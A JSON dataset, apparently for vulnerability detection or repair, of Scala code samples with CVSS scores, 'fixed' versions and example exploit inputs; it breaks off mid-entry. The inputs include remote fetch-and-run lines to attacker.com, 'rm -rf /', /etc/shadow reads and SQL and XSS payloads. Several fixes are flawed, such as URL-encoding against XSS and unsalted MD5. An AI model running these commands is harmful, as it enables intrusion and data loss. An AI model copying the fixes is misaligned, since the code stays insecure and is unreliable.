{
    "scala_0": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "def executeCommand(command: String): Unit = {\\n  import scala.sys.process._\\n  val cmd = Seq(\\\"bash\\\", \\\"-c\\\", command)\\n  cmd.!\\n}",
        "cvss_score": 8.5,
        "fixed_code": "def executeCommand(command: String): Unit = {\\n  import scala.sys.process._\\n  val allowedCommands = List(\\\"ls\\\", \\\"whoami\\\")\\n  if (allowedCommands.contains(command)) {\\n    Seq(\\\"bash\\\", \\\"-c\\\", command).!\\n  } else {\\n    println(\\\"Command not allowed\\\")\\n  }\\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "scala_1": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "class VulnerableExample {\\ndef renderUserInput(input: String): String = {\\n  s\"<div>$input</div>\"\\n}\\n}",
        "cvss_score": 6.1,
        "fixed_code": "import java.net.URLEncoder\nclass SecureExample {\n  def renderUserInput(input: String): String = {\n    val encodedInput = URLEncoder.encode(input, \"UTF-8\")\n    s\"<div>$encodedInput</div>\"\n  }\n}",
        "exploit_ways": [
            "An attacker can inject a script like <script>alert('XSS')</script> to execute JavaScript in the victim's browser.",
            "Malicious scripts can be used to steal cookies or session tokens from other users of the application.",
            "Attackers can use XSS vectors to perform actions on behalf of the user, such as posting content under their name."
        ]
    },
    "scala_2": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "class UserAuth {\\n  private var username: String = \"\"\\n  private var password: String = \"\"\\n\\n  def login(user: String, pass: String): Boolean = {\\n    if (user == username && pass == password) true else false\\n  }\\n\\n  def register(newUsername: String, newPassword: String): Unit = {\\n    username = newUsername\\n    password = newPassword\\n  }\\n}",
        "cvss_score": 6.5,
        "fixed_code": "import java.security.MessageDigest\\nclass UserAuth {\\n  private var storedHashedPassword: Array[Byte] = _\\n\\n  def hashPassword(password: String): Array[Byte] = {\\n    val md = MessageDigest.getInstance(\"SHA-256\")\\n    md.digest(password.getBytes)\\n  }\\n\\n  def login(userInput: String, passInput: String): Boolean = {\\n    storedHashedPassword sameElements hashPassword(passInput)\\n  }\\n\\n  def register(newUsername: String, newPassword: String): Unit = {\\n    // Store only the hashed password\\n    storedHashedPassword = hashPassword(newPassword)\\n  }\\n}",
        "exploit_ways": [
            "An attacker could guess or brute-force the username and password.",
            "If the same instance is reused, the attacker can register a new account with the same username to take over the existing user's credentials.",
            "A timing attack could be used to infer information about the length of the correct password."
        ]
    },
    "scala_3": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "def executeCommand(command: String): Process = {\n  val processBuilder = new java.lang.ProcessBuilder(\"bash\", \"-c\", command)\n  processBuilder.start()\n}",
        "cvss_score": 7.5,
        "fixed_code": "def executeCommand(command: String): Process = {\n  val allowedCommands = List(\"ls\", \"whoami\")\n  if (allowedCommands.contains(command)) {\n    val processBuilder = new java.lang.ProcessBuilder(List(\"bash\", \"-c\", command))\n    processBuilder.start()\n  } else {\n    throw new SecurityException(\"Command not allowed\")\n  }\n}",
        "exploit_ways": [
            "An attacker can input 'sudo rm -rf /' to delete all files on the system.",
            "Can use 'whoami; cat /etc/shadow' to obtain sensitive information.",
            "May chain commands like 'id; ls /root' to escalate privileges and access restricted data."
        ]
    },
    "scala_4": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "def unsafe(inputString: String): String = {\\n  s\"<script>alert('$inputString')</script>\"\\n}",
        "cvss_score": 6.1,
        "fixed_code": "import java.net.URLEncoder\ndef safe(inputString: String): String = {\\n  val encodedInput = URLEncoder.encode(inputString, \"UTF-8\")\\n  s\"<script>alert('$encodedInput')</script>\"\\n}",
        "exploit_ways": [
            "An attacker can input malicious JavaScript to steal cookies or session tokens.",
            "By injecting a script that redirects the user to another site, attackers can perform phishing attacks.",
            "Injecting event handlers like 'onclick' into the script tag to execute actions on user interaction."
        ]
    },
    "scala_5": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "import scala.io.StdIn\nobject VulnerableApp {\n  def main(args: Array[String]): Unit = {\n    println(\"Enter a command to execute:\")\n    val cmd = StdIn.readLine()\n    val process = Runtime.getRuntime.exec(cmd)\n    val output = new java.util.Scanner(process.getInputStream).useDelimiter(\\\\\"\\A\\\\\").next()\n    println(output)\n  }\n}",
        "cvss_score": 8.2,
        "fixed_code": "import scala.io.StdIn\nobject SecureApp {\n  def main(args: Array[String]): Unit = {\n    println(\"Enter a command to execute (only 'ls' is allowed):\")\n    val cmd = StdIn.readLine()\n    if (cmd == \"ls\") {\n      val process = Runtime.getRuntime.exec(Array(\"sh\", \"-c\", cmd))\n      val output = new java.util.Scanner(process.getInputStream).useDelimiter(\"\\A\").next()\n      println(output)\n    } else {\n      println(\"Command not allowed.\")\n    }\n  }\n}",
        "exploit_ways": [
            "User could input 'ls; rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'whoami; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "scala_6": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "class VulnerableController {\n  def transferMoney(request: HttpServletRequest): Unit = {\n    val toAccount = request.getParameter(\"toAccount\")\n    val amount = request.getParameter(\"amount\")\n    // Transfer money logic here\n  }\n}",
        "cvss_score": 6.5,
        "fixed_code": "class SecureController {\n  def transferMoney(request: HttpServletRequest): Unit = {\n    val csrfToken = request.getParameter(\"csrfToken\")\n    if (csrfToken == session.getAttribute(\"csrfToken\")) {\n      val toAccount = request.getParameter(\"toAccount\")\n      val amount = request.getParameter(\"amount\")\n      // Transfer money logic here\n    } else {\n      throw new SecurityException(\"CSRF Token Mismatch\")\n    }\n  }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link or form that sends a POST request to the transferMoney endpoint without proper CSRF protection, allowing unauthorized transactions.",
            "Using social engineering, an attacker can trick a user into clicking a specially crafted URL while logged into their bank account, leading to unintended money transfers.",
            "A malicious website could embed a hidden iframe that submits a form to the vulnerable application, exploiting the user's authenticated session."
        ]
    },
    "scala_7": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "def unsafeFunction(userInput: String): Unit = {\\n  val command = s\"/bin/bash -c \\\"$userInput\\\"\"\\n  Runtime.getRuntime.exec(command)\\n}",
        "cvss_score": 8.5,
        "fixed_code": "def safeFunction(userInput: String): Unit = {\\n  import java.util.Arrays\\n  val allowedCommands = Arrays.asList(\"ls\", \"whoami\")\\n  if (allowedCommands.contains(userInput)) {\\n    Runtime.getRuntime.exec(Array(\"/bin/bash\", \"-c\", userInput))\\n  } else {\\n    println(\"Command not allowed\")\\n  }\\n}",
        "exploit_ways": [
            "User could input 'sudo rm -rf /' to delete all files on the system.",
            "Could use 'id; sudo su' to gain root privileges.",
            "Could chain commands like 'echo hello > test.txt; cat /etc/shadow' to create a file and read sensitive data."
        ]
    },
    "scala_8": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "def readConfig(filePath: String): String = {\\n    val file = new java.io.File(filePath)\\n    scala.io.Source.fromFile(file).getLines().mkString(\"\")\\n}",
        "cvss_score": 8.5,
        "fixed_code": "def readConfig(filePath: String, baseDir: String): String = {\\n    val file = new java.io.File(baseDir + File.separator + filePath)\\n    scala.io.Source.fromFile(file).getLines().mkString(\"\")\\n}",
        "exploit_ways": [
            "An attacker can input '..\\config.txt' to read the parent directory's config file.",
            "They can provide a full path like '/etc/passwd' to access sensitive system files.",
            "Crafting a payload with special characters might lead to unexpected file reads or server crashes."
        ]
    },
    "scala_9": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import scala.io.StdIn\nobject VulnerableApp {\n  def main(args: Array[String]): Unit = {\n    println(\"Enter command to execute:\")\n    val command = StdIn.readLine()\n    Runtime.getRuntime.exec(command)\n  }\n}",
        "cvss_score": 8.2,
        "fixed_code": "import scala.io.StdIn\nobject SecureApp {\n  def main(args: Array[String]): Unit = {\n    println(\"Enter command to execute:\")\n    val allowedCommands = List(\"ls\", \"whoami\")\n    val command = StdIn.readLine()\n    if (allowedCommands.contains(command)) {\n      Runtime.getRuntime.exec(command)\n    } else {\n      println(\"Command not allowed\")\n    }\n  }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "scala_10": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "import java.io.{ByteArrayInputStream, ObjectInputStream}\nclass VulnerableApp {\n  def deserialize(bytes: Array[Byte]): Unit = {\n    val bis = new ByteArrayInputStream(bytes)\n    val ois = new ObjectInputStream(bis)\n    try {\n      ois.readObject()\n    } catch {\n      case e: Exception => println(e.getMessage())\n    }\n  }\n}",
        "cvss_score": 8.8,
        "fixed_code": "import java.io.{ByteArrayInputStream, ObjectInputStream}\nclass SecureApp {\n  def deserialize(bytes: Array[Byte]): Unit = {\n    // Implement safe deserialization logic here\n    println(\"Deserialization is disabled for security reasons.\")\n  }\n}",
        "exploit_ways": [
            "An attacker can send malicious serialized objects to execute arbitrary code.",
            "Attackers could exploit this vulnerability to perform remote code execution with the application's privileges.",
            "Malicious objects can be crafted to steal sensitive data from the application."
        ]
    },
    "scala_11": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "import java.util.Base64\n\ncase class User(username: String, passwordHash: String)\nobject AuthSystem {\n  private val users = scala.collection.mutable.Map[String, User]()\n\n  def addUser(username: String, password: String): Unit = {\n    val encoder = Base64.getEncoder()\n    val encodedPassword = encoder.encodeToString(password.getBytes())\n    users += (username -> User(username, encodedPassword))\n  }\n\n  def authenticate(username: String, password: String): Boolean = {\n    val decoder = Base64.getDecoder()\n    users.get(username) match {\n      case Some(user) =>\n        val decodedHash = new String(decoder.decode(user.passwordHash))\n        decodedHash == password\n      case None => false\n    }\n  }\n}\nobject Main extends App {\n  AuthSystem.addUser(\"admin\", \"password123\")\n  println(AuthSystem.authenticate(args(0), args(1)))\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.security.MessageDigest\nimport java.util.Base64\ncase class User(username: String, passwordHash: String)\nobject AuthSystem {\n  private val users = scala.collection.mutable.Map[String, User]()\n\n  def hashPassword(password: String): String = {\n    val bytes = MessageDigest.getInstance(\"SHA-256\").digest(password.getBytes())\n    Base64.getEncoder().encodeToString(bytes)\n  }\n\n  def addUser(username: String, password: String): Unit = {\n    val encodedPassword = hashPassword(password)\n    users += (username -> User(username, encodedPassword))\n  }\n\n  def authenticate(username: String, password: String): Boolean = {\n    users.get(username) match {\n      case Some(user) =>\n        hashPassword(password) == user.passwordHash\n      case None => false\n    }\n  }\n}\nobject Main extends App {\n  AuthSystem.addUser(\"admin\", \"password123\")\n  println(AuthSystem.authenticate(args(0), args(1)))\n}",
        "exploit_ways": [
            "An attacker can use rainbow table attacks to find plaintext passwords for hashed values.",
            "They could try brute force attacks on the authenticate method if they know a valid username.",
            "By gaining access to the application's source code, an attacker could exploit the decoding vulnerability."
        ]
    },
    "scala_12": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "def unsafeQuery(param: String): List[String] = {\\n  val query = s\"SELECT * FROM users WHERE username = '$param'\"\\n  executeQuery(query)\\n}",
        "cvss_score": 8.2,
        "fixed_code": "def safeQuery(param: String): List[String] = {\\n  val query = \"SELECT * FROM users WHERE username = ?\"\\n  executeQueryWithParams(query, List(param))\\n}",
        "exploit_ways": [
            "An attacker can input 'admin' OR '1'='1' to bypass authentication.",
            "They can use 'UNION SELECT' to extract data from other tables.",
            "Input like '; DROP TABLE users' can delete critical data."
        ]
    },
    "scala_13": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "import scala.io.StdIn\\ndef authenticate(): Boolean = {\\n    val username = StdIn.readLine(\"Enter username: \")\\n    val password = StdIn.readLine(\"Enter password: \")\\n    if (username == \"admin\" && password == getPasswordHash(username)) true else false\\n}\\ndef getPasswordHash(user: String): String = {\\n    // Simulated hash retrieval\\n    user match {\\n        case \"admin\" => \"5f4dcc3b5aa765d61d8327deb882cf99\"\\n        case _ => \"\"\\n    }\\n}",
        "cvss_score": 8.0,
        "fixed_code": "import scala.io.StdIn\nimport java.security.MessageDigest\n\ndef authenticate(): Boolean = {\n    val username = StdIn.readLine(\"Enter username: \")\n    val password = StdIn.readLine(\"Enter password: \")\n    val hashedPassword = hashPassword(password)\n    if (username == \"admin\" && hashedPassword == getPasswordHash(username)) true else false\n}\ndef getPasswordHash(user: String): String = {\n    // Simulated hash retrieval\n    user match {\n        case \"admin\" => \"5f4dcc3b5aa765d61d8327deb882cf99\" // Hash for password 'password'\n        case _ => \"\"\n    }\n}\ndef hashPassword(password: String): String = {\n    val md = MessageDigest.getInstance(\"MD5\")\n    md.update(password.getBytes)\n    md.digest.map(0xFF & _).map { \"%02x\".format(_) }.mkString\n}",
        "exploit_ways": [
            "An attacker could try common default passwords like 'admin' or 'password'.",
            "By using a rainbow table, an attacker might find the password for the admin account.",
            "If the system is reused with known vulnerabilities, an attacker could exploit session hijacking techniques."
        ]
    },
    "scala_14": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import java.io.FileReader\nclass FileViewer {\n  def viewFile(filePath: String): Unit = {\n    val reader = new FileReader(filePath)\n    var i: Int = reader.read()\n    while (i != -1) {\n      print(i.toChar)\n      i = reader.read()\n    }\n    reader.close()\n  }\n}\nobject Main extends App {\n  if (args.length > 0) {\n    val viewer = new FileViewer\n    viewer.viewFile(args(0))\n  } else {\n    println(\"Please provide a file path.\")\n  }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.io.FileReader\nimport java.nio.file.{Paths, Files}\nclass FileViewer {\n  def viewFile(filePath: String): Unit = {\n    val validPath = Paths.get(\"safe_directory\").resolve(filePath).normalize()\n    if (!validPath.startsWith(Paths.get(\"safe_directory\"))) {\n      println(\"Invalid file path\")\n      return\n    }\n    if (Files.exists(validPath)) {\n      val reader = new FileReader(validPath.toFile)\n      var i: Int = reader.read()\n      while (i != -1) {\n        print(i.toChar)\n        i = reader.read()\n      }\n      reader.close()\n    } else {\n      println(\"File does not exist\")\n    }\n  }\n}\nobject Main extends App {\n  if (args.length > 0) {\n    val viewer = new FileViewer\n    viewer.viewFile(args(0))\n  } else {\n    println(\"Please provide a file path.\")\n  }\n}",
        "exploit_ways": [
            "An attacker could input '../../etc/passwd' to read sensitive system files.",
            "Using '../confidential/file.txt' allows access to potentially confidential data.",
            "Crafting the path with './malicious_script.sh' could execute a script if file permissions allow."
        ]
    },
    "scala_15": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "def transferFunds(user: String, amount: Double): Boolean = {\n  // Simulate transferring funds\n  println(s\"Transferring $$amount to $user\")\n  true\n}",
        "cvss_score": 6.8,
        "fixed_code": "def transferFunds(user: String, amount: Double, csrfToken: String): Boolean = {\n  val expectedCsrfToken = session.get(\"csrfToken\") // Assume session management is in place\n  if (csrfToken == expectedCsrfToken) {\n    println(s\"Transferring $$amount to $user\")\n    true\n  } else {\n    false\n  }\n}",
        "exploit_ways": [
            "An attacker can create a malicious web page that, when visited by the victim, automatically submits a form transferring funds without their consent.",
            "Using JavaScript, an attacker can craft a request to transfer funds from the victim's account to another account controlled by the attacker.",
            "If CSRF protection tokens are not implemented, attackers could exploit this vulnerability through email phishing where victims click on links or open attachments that perform unauthorized actions."
        ]
    },
    "scala_16": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "def authenticate(password: String): Boolean = {\n  val storedPassword = \"secret123\"\n  password.hashCode() == storedPassword.hashCode()\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.security.MessageDigest\n\ndef authenticate(password: String): Boolean = {\n  val md = MessageDigest.getInstance(\"SHA-256\")\n  val hashedStoredPassword = \"2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b\"\n  val hashedInputPassword = md.digest(password.getBytes()).map(0xFF & _).map { \"%02x\".format(_) }.mkString\n  hashedStoredPassword == hashedInputPassword\n}",
        "exploit_ways": [
            "An attacker could use a hash collision to provide a password that hashes to the same value as the stored password.",
            "By brute-forcing common passwords, an attacker might find one that happens to have the same hash as the stored password.",
            "Crafting specific input strings that produce the same hash value as the stored password can bypass authentication."
        ]
    },
    "scala_17": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "def executeCommand(command: String): Unit = {\n    import scala.sys.process._\n    command !\n}",
        "cvss_score": 8.2,
        "fixed_code": "def executeCommand(command: String): Unit = {\n    import scala.sys.process._\n    val allowedCommands = List(\"ls\", \"whoami\")\n    if (allowedCommands.contains(command)) {\n        command !\n    } else {\n        println(\"Command not allowed\")\n    }\n}",
        "exploit_ways": [
            "An attacker could input 'rm -rf /' to delete all files on the system.",
            "They could chain commands like 'whoami; cat /etc/passwd' to gather sensitive information.",
            "Using 'wget http://attacker.com/malware.sh -O - | sh' an attacker can execute remote code."
        ]
    },
    "scala_18": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "def unsafeDeserialize(inputString: String): AnyRef = {\n    val bytes = Base64.getDecoder.decode(inputString)\n    val ois = new ObjectInputStream(new ByteArrayInputStream(bytes))\n    ois.readObject()\n}",
        "cvss_score": 7.5,
        "fixed_code": "def safeDeserialize(inputString: String): AnyRef = {\n    // Use a safer serialization format like JSON\n    import org.json4s._\n    import org.json4s.jackson.JsonMethods._\n    implicit val formats = DefaultFormats\n    parse(inputString).extract[AnyRef]\n}",
        "exploit_ways": [
            "An attacker could craft a malicious serialized object that executes arbitrary code upon deserialization.",
            "By sending specially crafted input, the attacker can exploit vulnerable classes leading to remote code execution.",
            "Insecure deserialization might allow attackers to manipulate application data leading to privilege escalation."
        ]
    },
    "scala_19": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import scala.io.StdIn\\nobject VulnerableApp {\\ndef main(args: Array[String]) = {\\nval cmd = StdIn.readLine(\"Enter command to execute: \")\\nnew java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\\\\\"\\\\A\\\\\").next()\\n}\\n}",
        "cvss_score": 8.2,
        "fixed_code": "import scala.io.StdIn\\nobject SecureApp {\\ndef main(args: Array[String]) = {\\nval allowedCommands = List(\"ls\", \"whoami\")\\nval cmd = StdIn.readLine(\"Enter command to execute: \")\\nif (allowedCommands.contains(cmd)) {\\nnew java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\\\\\"\\\\A\\\\\").next()\\n} else {\\nprintln(\"Command not allowed\")\\n}\\n}\\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "scala_20": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "import scala.sys.process._\ndef executeCommand(cmd: String): Unit = {\"sudo \" + cmd !}",
        "cvss_score": 8.2,
        "fixed_code": "import scala.sys.process._\ndef executeCommand(cmd: String): Unit = {\n    val allowedCommands = List(\"update\", \"upgrade\")\n    if (allowedCommands.contains(cmd)) {\n        s\"sudo $cmd\" !\n    } else {\n        println(\"Command not allowed\")\n    }\n}",
        "exploit_ways": [
            "An attacker can execute arbitrary commands with elevated privileges by passing malicious input.",
            "Could inject 'sudo -i' to gain a root shell if the user has sudo permissions without password.",
            "Possible to run 'apt-get install malicious_package' to install malware on the system."
        ]
    },
    "scala_21": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "import java.io.{ObjectInputStream, ByteArrayInputStream}\ndef deserialize(data: Array[Byte]): Object = {\n    val bais = new ByteArrayInputStream(data)\n    val ois = new ObjectInputStream(bais)\n    val obj = ois.readObject()\n    ois.close()\n    bais.close()\n    obj\n}",
        "cvss_score": 8.5,
        "fixed_code": "import java.io.{ByteArrayInputStream, ObjectInputStream}\ndef deserialize(data: Array[Byte]): Option[YourAllowedClass] = {\n    val allowedClasses = Set(classOf[YourAllowedClass])\n    val bais = new ByteArrayInputStream(data)\n    val ois = new ObjectInputStream(bais) {\n        override def resolveClass(desc: java.io.ObjectStreamClass): Class[_] = {\n            val cl = super.resolveClass(desc)\n            if (!allowedClasses.contains(cl)) throw new SecurityException(s\"Unauthorized deserialization attempt for class: ${cl.getName}\")\n            cl\n        }\n    }\n    try {\n        val obj = ois.readObject()\n        Some(obj.asInstanceOf[YourAllowedClass])\n    } catch {\n        case e: SecurityException => None\n        case _: Throwable => None\n    } finally {\n        ois.close()\n        bais.close()\n    }\n}",
        "exploit_ways": [
            "An attacker can send a malicious serialized object that executes arbitrary code upon deserialization.",
            "Crafted payloads can be used to exploit known vulnerabilities in the libraries or classes being deserialized.",
            "The attacker could perform denial-of-service attacks by sending malformed serialized data, causing exceptions and resource exhaustion."
        ]
    },
    "scala_22": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import java.io.FileReader\n\ndef readFile(filePath: String): Unit = {\n  val reader = new FileReader(filePath)\n  var i: Int = reader.read()\n  while (i != -1) {\n    print(i.toChar)\n    i = reader.read()\n  }\n  reader.close()\n}\n\nobject Main extends App {\n  println(\"Enter file path:\")\n  val inputPath = scala.io.StdIn.readLine()\n  readFile(inputPath)\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.io.FileReader\nimport java.nio.file.{Paths, Files}\ndef readFile(filePath: String): Unit = {\n  val allowedDirectory = Paths.get(\"/safe/directory\")\n  val absoluteFilePath = Paths.get(allowedDirectory.toString, filePath).normalize()\n  if (!absoluteFilePath.startsWith(allowedDirectory)) {\n    throw new IllegalArgumentException(\"Access denied\")\n  }\n  if (Files.exists(absoluteFilePath) && !Files.isDirectory(absoluteFilePath)) {\n    val reader = new FileReader(absoluteFilePath.toFile)\n    var i: Int = reader.read()\n    while (i != -1) {\n      print(i.toChar)\n      i = reader.read()\n    }\n    reader.close()\n  } else {\n    println(\"File does not exist or is a directory.\")\n  }\n}\n\nobject Main extends App {\n  println(\"Enter file path:\")\n  val inputPath = scala.io.StdIn.readLine()\n  readFile(inputPath)\n}",
        "exploit_ways": [
            "User could input \"../etc/passwd\" to read the system's password file.",
            "An attacker might provide \"/var/log/syslog\" to access sensitive logs.",
            "Using a crafted path like \"../../../../../etc/shadow\", an attacker can attempt to steal hashed passwords."
        ]
    },
    "scala_23": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileReader {\n  def readFile(filePath: String): String = {\n    val file = new java.io.File(filePath)\n    val source = scala.io.Source.fromFile(file)\n    try source.mkString finally source.close()\n  }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileReader {\n  def readFile(baseDir: String, filePath: String): String = {\n    val base = new java.io.File(baseDir)\n    val file = new java.io.File(base, filePath).getCanonicalFile\n    if (!file.getPath.startsWith(base.getPath)) {\n      throw new IllegalArgumentException(\"Access Denied\")\n    }\n    val source = scala.io.Source.fromFile(file)\n    try source.mkString finally source.close()\n  }\n}",
        "exploit_ways": [
            "An attacker could input '../../etc/passwd' to read system files.",
            "By using '../config/database.yml', sensitive database credentials can be accessed.",
            "Inputting '..\\..\\flag.txt' on Windows systems may allow attackers to read arbitrary files."
        ]
    },
    "scala_24": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "package com.example\n\nimport scala.collection.mutable.ListBuffer\nimport akka.actor.Actor\nimport akka.actor.Props\nimport spray.routing.HttpService\nimport akka.io.IO\nimport spray.can.Http\nimport spray.http.MediaTypes._\n\nobject WebServer {\n  def main(args: Array[String]): Unit = {\n    val system = akka.actor.ActorSystem(\"webserver\")\n    val serviceActor = system.actorOf(Props[WebServer])\n    IO(Http) ! Http.Bind(serviceActor, interface = \"localhost\", port = 8080)\n  }\n}\n\nclass WebServer extends Actor with HttpService {\n  def actorRefFactory = context\n\n  val route =\n    path(\"transfer\") {\n      parameter('amount.as[Int], 'to) { (amount, to) =>\n        // This is vulnerable to CSRF as there's no verification of the request origin.\n        performTransfer(amount, to)\n        complete(s\"Transferred $amount to $to\")\n      }\n    }\n\n  private def performTransfer(amount: Int, to: String): Unit = {\n    // Simulate a transfer operation\n    println(s\"Transferring $amount to $to\")\n  }\n}",
        "cvss_score": 7.5,
        "fixed_code": "package com.example\n\nimport scala.collection.mutable.ListBuffer\nimport akka.actor.Actor\nimport akka.actor.Props\nimport spray.routing.HttpService\nimport akka.io.IO\nimport spray.can.Http\nimport spray.http.MediaTypes._\nimport java.util.UUID\n\nobject WebServer {\n  def main(args: Array[String]): Unit = {\n    val system = akka.actor.ActorSystem(\"webserver\")\n    val serviceActor = system.actorOf(Props[WebServer])\n    IO(Http) ! Http.Bind(serviceActor, interface = \"localhost\", port = 8080)\n  }\n}\n\nclass WebServer extends Actor with HttpService {\n  def actorRefFactory = context\n  val tokenMap = scala.collection.mutable.Map[String, Boolean]()\n\n  def generateToken(): String = {\n    val token = UUID.randomUUID().toString()\n    tokenMap += (token -> true)\n    token\n  }\n\n  val route =\n    path(\"generate-token\") {\n      get {\n        complete(generateToken())\n      }\n    } ~\n    path(\"transfer\") {\n      formFields('amount.as[Int], 'to, 'csrfToken) { (amount, to, csrfToken) =>\n        if (tokenMap.contains(csrfToken)) {\n          tokenMap -= csrfToken\n          performTransfer(amount, to)\n          complete(s\"Transferred $amount to $to\")\n        } else {\n          reject(ValidationRejection(\"Invalid CSRF Token\"))\n        }\n      }\n    }\n\n  private def performTransfer(amount: Int, to: String): Unit = {\n    // Simulate a transfer operation\n    println(s\"Transferring $amount to $to\")\n  }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link or form that sends a request to the /transfer endpoint without user consent.",
            "By tricking a logged-in user into visiting a compromised site, an attacker can use CSRF to transfer funds from the user's account.",
            "The vulnerability allows attackers to perform unauthorized actions on behalf of authenticated users without their knowledge."
        ]
    },
    "scala_25": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import scala.io.Source\n\nclass FileManager {\n    def readFile(filePath: String): String = {\n        val fileContent = Source.fromFile(filePath).getLines().mkString(\"\\n\")\n        fileContent\n    }\n}\n\nobject Main extends App {\n    val fm = new FileManager()\n    println(fm.readFile(args(0)))\n}",
        "cvss_score": 5.3,
        "fixed_code": "import scala.io.Source\nimport java.nio.file.{Paths, Files}\nimport java.nio.file.attribute.BasicFileAttributes\n\nclass FileManager {\n    def readFile(filePath: String): String = {\n        val allowedPath = Paths.get(\"/safe/directory\")\n        val resolvedPath = allowedPath.resolve(Paths.get(filePath)).normalize()\n        if (!resolvedPath.startsWith(allowedPath)) throw new SecurityException(\"Access Denied\")\n        val fileContent = Source.fromFile(resolvedPath.toFile).getLines().mkString(\"\\n\")\n        fileContent\n    }\n}\n\nobject Main extends App {\n    val fm = new FileManager()\n    println(fm.readFile(args(0)))\n}",
        "exploit_ways": [
            "An attacker can input '../../../../etc/passwd' to read the system's password file.",
            "Using relative paths like 'config/../secrets.txt' could expose sensitive configuration data.",
            "Crafting inputs with symbolic links may allow access to unintended files outside the expected directory."
        ]
    },
    "scala_26": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "def unsafeFunction(): Unit = {\n  var counter = 0\n  val threads = List.fill(10)(new Thread(() => {\n    for (_ <- 1 to 1000) counter += 1\n  }))\n  threads.foreach(_.start())\n  threads.foreach(_.join())\n  println(s\"Final counter value: $counter\")\n}",
        "cvss_score": 5.3,
        "fixed_code": "def safeFunction(): Unit = {\n  import java.util.concurrent.atomic.AtomicInteger\n  val counter = new AtomicInteger(0)\n  val threads = List.fill(10)(new Thread(() => {\n    for (_ <- 1 to 1000) counter.incrementAndGet()\n  }))\n  threads.foreach(_.start())\n  threads.foreach(_.join())\n  println(s\"Final counter value: ${counter.get()}\")\n}",
        "exploit_ways": [
            "An attacker could run the function multiple times to observe inconsistent final counter values.",
            "If integrated into a larger system, the race condition might lead to incorrect state updates affecting application behavior.",
            "In rare cases, an attacker could manipulate the timing of thread execution to force specific values in the shared variable."
        ]
    },
    "scala_27": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "def infiniteLoop(): Unit = { while (true) {} }",
        "cvss_score": 3.0,
        "fixed_code": "def controlledLoop(maxIterations: Int): Unit = { var i = 0; while (i < maxIterations) { i += 1 } }",
        "exploit_ways": [
            "An attacker can trigger the infinite loop to consume CPU resources indefinitely.",
            "By calling this function, it can block further execution of other threads or processes in a multi-threaded environment.",
            "If this is part of a web service, it could lead to server unresponsiveness."
        ]
    },
    "scala_28": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "class UnsafeBankAccount {\n  private var balance = 0\n\n  def deposit(amount: Int) = this.synchronized {\n    balance += amount\n  }\n\n  def withdraw(amount: Int) = {\n    if (balance >= amount) {\n      Thread.sleep(10)\n      balance -= amount\n    }\n  }\n}",
        "cvss_score": 5.8,
        "fixed_code": "class SafeBankAccount {\n  private var balance = 0\n\n  def deposit(amount: Int) = this.synchronized {\n    balance += amount\n  }\n\n  def withdraw(amount: Int) = this.synchronized {\n    if (balance >= amount) {\n      Thread.sleep(10)\n      balance -= amount\n    }\n  }\n}",
        "exploit_ways": [
            "An attacker can cause a race condition to occur by rapidly depositing and withdrawing funds in different threads, leading to inconsistent balance states.",
            "By timing attacks, an attacker might exploit the sleep delay to interfere with the balance check and subtraction, potentially causing overdrafts or other inconsistencies.",
